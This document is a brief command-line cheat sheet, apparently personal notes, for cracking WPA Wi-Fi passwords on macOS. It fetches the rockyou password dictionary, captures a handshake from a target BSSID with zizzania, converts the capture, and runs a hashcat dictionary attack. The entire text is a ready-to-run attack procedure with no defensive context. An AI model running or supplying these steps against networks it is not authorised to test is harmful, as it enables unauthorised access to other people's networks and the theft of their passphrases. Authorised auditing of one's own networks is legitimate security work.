# brew install libpcap hashcat

# get dictionary
wget http://downloads.skullsecurity.org/passwords/rockyou.txt.bz2
bunzip2 rockyou.txt.bz2

# ------------------------

# cracking steps
airport -s
sudo airport --disassociate
sudo airport --channel=1

sudo zizzania -i en0 -b <BSSID> -w cap/capture.pcap -v

# convert pcap to hccapx
cap2hccapx capture.pcap capture.hccapx

hashcat -m 2500 capture.hccapx dict/rockyou.txt
